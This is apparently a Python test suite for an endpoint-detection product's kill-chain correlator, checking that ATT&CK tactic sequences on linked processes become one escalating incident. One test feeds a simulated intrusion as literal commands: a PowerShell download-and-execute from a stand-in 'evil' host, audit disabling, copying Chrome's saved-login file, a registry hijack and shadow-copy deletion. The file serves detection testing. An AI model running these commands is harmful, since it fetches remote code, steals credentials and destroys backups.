#!/usr/bin/env python3
"""Multi-stage kill-chain correlation tests.

Pins the fix for the measured correlation gap: the base correlator groups
detections by SAME category, so one intrusion (execution -> C2 -> persistence
on the same process) fragmented into several individually-unremarkable
incidents. The kill-chain correlator scores the *sequence* and raises one
escalating incident.

  [1] Pure mapping + scoring: technique->tactic, score rises with distinct
      tactics, high-impact bump, severity thresholds
  [2] Correlator: emits only on >=2 distinct tactics, only on GROWTH (no
      alert storm), window eviction, unattributable/unmapped inputs ignored
  [3] Engine end-to-end: three same-process detections across three tactics
      raise ONE 'attack_chain' incident; benign single-tactic activity does
      not; the chain explains itself and maps to MITRE
"""

from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

_FAILURES: list[str] = []


def _check(label: str, ok: bool) -> None:
    print(f"  [{'+' if ok else '!'}] {label}: {'PASS' if ok else 'FAIL'}")
    if not ok:
        _FAILURES.append(label)


def main() -> int:
    from valkyrie.edr.killchain import (
        KillChainCorrelator, tactic_for, extract_technique_id, score_chain,
        HIGH_IMPACT_TACTICS,
    )

    print("\n=== kill-chain correlation ===\n")

    print("[1] Technique → tactic + scoring (pure)")
    _check("PowerShell → execution", tactic_for("T1059.001 — PowerShell") == "execution")
    _check("DNS C2 → command-and-control", tactic_for("T1071.004") == "command-and-control")
    _check("Run key → persistence", tactic_for("T1547.001") == "persistence")
    _check("LSASS → credential-access", tactic_for("T1003.001") == "credential-access")
    _check("ransomware → impact", tactic_for("T1486") == "impact")
    _check("sub-technique falls back to base",
           tactic_for("T1055.999 — unknown sub") == "defense-evasion")
    _check("unmapped technique → None", tactic_for("T9999") is None)
    _check("no id in text → None", tactic_for("just words") is None)
    _check("extract id from label", extract_technique_id("T1003.001 — LSASS") == "T1003.001")

    s2, sev2 = score_chain({"execution", "command-and-control"})
    s3, sev3 = score_chain({"execution", "command-and-control", "persistence"})
    s4, _ = score_chain({"execution", "command-and-control", "persistence", "impact"})
    _check("2 tactics scores below 3", s2 < s3)
    _check("3 tactics scores below 4", s3 < s4)
    _check("high-impact tactic raises the score",
           score_chain({"execution", "impact"})[0] > 0.25 * 2)
    _check("4-tactic chain reaching impact is critical", sev4_is_crit := (score_chain(
        {"execution", "command-and-control", "persistence", "impact"})[1] == "critical"))
    _check("2 benign-ish tactics is at most high", sev2 in ("medium", "high"))

    print("\n[1b] SHIPPED DEFAULT requires 3 tactics, not 2")
    # Regression for a live FP: the class default had drifted to min_tactics=2,
    # which raised "multi-stage attack" incidents against ordinary powershell.exe
    # admin scripting and TiWorker.exe (Windows Modules Installer - a legitimate
    # OS component) purely from two loosely-related tactic labels within the
    # 10-minute window. The module's own docstring says "three distinct tactics
    # ... is an attack" - this pins the DEFAULT constructor (no explicit
    # min_tactics) actually enforces that, not the weaker threshold.
    kdef = KillChainCorrelator(window_seconds=600)   # no min_tactics -> use default
    now_d = 2000.0
    _check("1st tactic via default ctor → no chain",
           kdef.observe("TiWorker.exe", "T1059.001", "exec", now_d) is None)
    _check("2 tactics via DEFAULT ctor must NOT chain (this was the live FP)",
           kdef.observe("TiWorker.exe", "T1547.001", "run key", now_d + 1) is None)
    c_def = kdef.observe("TiWorker.exe", "T1071.004", "beacon", now_d + 2)
    _check("3rd distinct tactic via default ctor DOES chain",
           c_def is not None and c_def["distinct_tactics"] == 3)

    print("\n[2] Correlator (deterministic ts)")
    kc = KillChainCorrelator(window_seconds=600, min_tactics=2)
    now = 1000.0
    _check("single tactic → no chain",
           kc.observe("powershell.exe", "T1059.001", "encoded cmd", now) is None)
    c = kc.observe("powershell.exe", "T1071.004", "DNS beacon", now + 5)
    _check("second distinct tactic → chain emitted", c is not None)
    _check("chain names the actor", c and c["actor"] == "powershell.exe")
    _check("chain lists 2 distinct tactics", c and c["distinct_tactics"] == 2)
    _check("chain explains itself", c and "independent ATT&CK tactics" in c["explanation"])
    # Same tactic again -> no NEW tactic -> stays quiet (no alert storm)
    _check("repeat tactic does not re-alert",
           kc.observe("powershell.exe", "T1071.004", "DNS beacon 2", now + 6) is None)
    # Third distinct tactic -> grows -> re-emits, higher score
    c3 = kc.observe("powershell.exe", "T1547.001", "run key", now + 7)
    _check("new tactic re-emits with growth", c3 is not None and c3["distinct_tactics"] == 3)
    _check("score grew with the third stage", c3 and c3["score"] > c["score"])
    # Different actor is independent
    _check("unrelated actor not folded in",
           kc.observe("chrome.exe", "T1059.001", "x", now + 8) is None)
    # Unattributable / unmapped ignored
    _check("no actor → ignored", kc.observe("", "T1059.001", "x", now + 9) is None)
    _check("unmapped technique → ignored",
           kc.observe("evil.exe", "T9999", "x", now + 9) is None)
    # Window eviction: a tactic older than the window drops out
    kc2 = KillChainCorrelator(window_seconds=100, min_tactics=2)
    kc2.observe("mal.exe", "T1059.001", "exec", 0.0)
    _check("stale first tactic evicted → second alone is no chain",
           kc2.observe("mal.exe", "T1071.004", "c2", 500.0) is None)

    print("\n[2b] Process lineage (parent → child via ppid)")
    kl = KillChainCorrelator(window_seconds=600, min_tactics=2)
    # Parent powershell (pid 100) executes; child rundll32 (pid 200, ppid 100)
    # beacons. Different process NAMES and PIDs, but the ppid edge links them.
    _check("parent's first tactic alone → no chain",
           kl.observe("powershell.exe", "T1059.001", "exec", 1000.0, pid=100) is None)
    cl = kl.observe("rundll32.exe", "T1071.004", "beacon", 1001.0, pid=200, ppid=100)
    _check("child links to parent's chain via ppid", cl is not None)
    _check("chain spans 2 linked processes", cl and cl["processes"] == 2)
    _check("chain lists both process names",
           cl and set(cl["actors"]) == {"powershell.exe", "rundll32.exe"})
    _check("explanation names the linked processes",
           cl and "linked processes" in cl["explanation"])
    # Grandchild (pid 300, ppid 200) adds persistence -> 3 tactics, 3 processes
    cg = kl.observe("reg.exe", "T1547.001", "run key", 1002.0, pid=300, ppid=200)
    _check("grandchild extends the same chain", cg is not None and cg["processes"] == 3)
    _check("three-stage lineage chain scores higher", cg and cg["score"] > cl["score"])
    # Two unrelated PIDs with NO ppid edge must NOT merge
    kd = KillChainCorrelator(window_seconds=600, min_tactics=2)
    kd.observe("a.exe", "T1059.001", "exec", 1.0, pid=5001)
    _check("unrelated PID (no ppid edge) does not merge",
           kd.observe("b.exe", "T1071.004", "c2", 2.0, pid=6002) is None)
    # Same PID across tactics still merges (same process, no ppid needed)
    ks = KillChainCorrelator(window_seconds=600, min_tactics=2)
    ks.observe("x.exe", "T1059.001", "exec", 1.0, pid=7003)
    _check("same PID across tactics merges",
           ks.observe("x.exe", "T1486", "encrypt", 2.0, pid=7003) is not None)

    # [2c] A realistic multi-tactic intrusion, each step a REAL command run
    # through the actual classifier, must correlate into ONE critical incident
    # that reaches an objective tactic - detect-AND-block at the chain level.
    from valkyrie.behavioral_rules import classify_behavior
    _bn = lambda p: (p or "").replace("/", "\\").rsplit("\\", 1)[-1].lower()
    intrusion = [
        ("powershell.exe", "cmd.exe", r"powershell irm http://evil/a.ps1 | iex"),
        ("auditpol.exe", "powershell.exe", r"auditpol /set /category:* /success:disable"),
        ("cmd.exe", "powershell.exe", r'cmd /c copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" C:\Users\Public\ld.db'),
        ("reg.exe", "powershell.exe", r"reg add HKCU\Software\Classes\ms-settings\shell\open\command /d evil.exe /f"),
        ("wmic.exe", "powershell.exe", r"wmic shadowcopy delete /nointeractive"),
    ]
    kchain = KillChainCorrelator(window_seconds=600, min_tactics=3)
    chain_final = None
    all_detected = True
    for i, (image, parent, cmd) in enumerate(intrusion):
        hit = classify_behavior(_bn(image), _bn(parent), cmd, image)
        if hit is None:
            all_detected = False
            continue
        s = kchain.observe(_bn(image), hit["technique"], "step", 1000.0 + i,
                           pid=4242, ppid=4241)
        if s:
            chain_final = s
    _check("every step of the real intrusion is detected", all_detected)
    _check("the intrusion correlates into a multi-stage incident",
           chain_final is not None)
    _check("chain reaches >=4 distinct tactics",
           chain_final and chain_final["distinct_tactics"] >= 4)
    _check("chain escalates to critical and reaches an objective tactic",
           chain_final and chain_final["severity"] == "critical"
           and chain_final["reaches_objective"])

    print("\n[3] Engine end-to-end")
    import tempfile
    from valkyrie.store import Store
    from valkyrie.edr import EdrEngine
    from valkyrie.edr.schema import Detection
    with tempfile.TemporaryDirectory() as td:
        store = Store(db_path=Path(td) / "kc.db"); store.start()
        engine = EdrEngine(store); engine.start()

        # Same process, three ATT&CK tactics, in-window. process_pid is the
        # SAME real attributed PID across all three (this is genuinely one
        # process, per the test's own docstring) - added alongside the
        # confidence-model fix so this fixture matches what real telemetry
        # actually provides (process_telemetry/Sysmon always carry a pid;
        # the ADR itself says so) rather than relying on process_name string
        # equality, which is the weaker, unverified-lineage path.
        engine.report_detection(Detection(source="etw.ps", severity="medium",
            category="process", title="encoded PowerShell", entity="C:/x",
            process_name="powershell.exe", process_pid=4242,
            technique="T1059.001 — PowerShell"))
        engine.report_detection(Detection(source="dns.beacon", severity="high",
            category="intelligence", title="C2 beacon", entity="evil-c2.example",
            process_name="powershell.exe", process_pid=4242,
            technique="T1071.004 — DNS C2"))
        engine.report_detection(Detection(source="etw.persist", severity="high",
            category="persistence", title="Run key", entity="HKCU\\...\\Run",
            process_name="powershell.exe", process_pid=4242,
            technique="T1547.001 — Run key"))
        time.sleep(0.2)

        incidents = engine.list_incidents()
        chains = [i for i in incidents if i["category"] == "attack_chain"]
        _check("a single attack_chain incident was raised", len(chains) == 1)
        if chains:
            ch = engine.get_incident(chains[0]["id"])
            _check("chain incident is high or critical",
                   ch["severity"] in ("high", "critical"))
            det0 = (ch.get("detections") or [{}])[0]
            reason = (det0.get("details") or {}).get("reason", "")
            _check("chain incident explains itself", "ATT&CK tactics" in reason)
            _check("chain carries multiple techniques",
                   ";" in (det0.get("technique") or ""))

        # A different process doing ONE thing must NOT create a chain.
        engine.report_detection(Detection(source="dns", severity="low",
            category="tracker", title="ad", entity="doubleclick.net",
            process_name="chrome.exe", technique="T1041"))
        time.sleep(0.15)
        chains2 = [i for i in engine.list_incidents() if i["category"] == "attack_chain"]
        _check("single-tactic benign actor raised no chain", len(chains2) == 1)

        # Explainability coverage for the new categories.
        from valkyrie.edr.investigate import KNOWN_INCIDENT_CATEGORIES, _MEANING, _RECOMMEND
        for cat in ("attack_chain", "tunnel", "dyndns"):
            _check(f"'{cat}' has meaning + recommendation",
                   cat in KNOWN_INCIDENT_CATEGORIES and cat in _MEANING and cat in _RECOMMEND)

        engine.stop(); store.stop()

    print("\n[3b] Lineage end-to-end via ingest_telemetry (fields.ppid → chain)")
    with tempfile.TemporaryDirectory() as td:
        store = Store(db_path=Path(td) / "kc2.db"); store.start()
        engine = EdrEngine(store); engine.start()
        # Parent powershell (pid 100) - execution.
        engine.ingest_telemetry({
            "category": "process", "activity": "exec", "action": "flagged",
            "severity": "high", "labels": ["stealth_flags"], "reason": "stealthy PS",
            "actor_name": "powershell.exe", "actor_pid": 100, "fields": {}})
        # Child rundll32 (pid 200, ppid 100) - defense-evasion (injection).
        engine.ingest_telemetry({
            "category": "process", "activity": "inject", "action": "flagged",
            "severity": "high", "labels": ["remote_thread_injection"],
            "reason": "remote thread", "actor_name": "rundll32.exe",
            "actor_pid": 200, "fields": {"ppid": 100, "parent_name": "powershell.exe"}})
        # Same rundll32 (pid 200) - credential-access (a 3rd distinct tactic).
        # The shipped default is min_tactics=3 (see [1b] above), so the engine
        # end-to-end wiring needs a genuine 3-tactic chain to exercise it -
        # this also matches the real inject-then-creds attack shape.
        engine.ingest_telemetry({
            "category": "process", "activity": "lsass_access", "action": "flagged",
            "severity": "high", "labels": ["lsass_access"],
            "reason": "lsass read", "actor_name": "rundll32.exe",
            "actor_pid": 200, "fields": {"technique": "T1003.001 — LSASS Memory"}})
        time.sleep(0.2)
        chains = [i for i in engine.list_incidents() if i["category"] == "attack_chain"]
        _check("parent→child telemetry raised ONE chain incident", len(chains) == 1)
        if chains:
            ch = engine.get_incident(chains[0]["id"])
            chain_data = ((ch.get("detections") or [{}])[0].get("details") or {}).get("chain", {})
            _check("chain spans both processes end-to-end",
                   chain_data.get("processes") == 2)
        engine.stop(); store.stop()

    print("\n" + "=" * 50)
    if _FAILURES:
        print(f"FAILED: {len(_FAILURES)} check(s)")
        for f in _FAILURES:
            print(f"  - {f}")
        return 1
    print("All checks PASSED.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
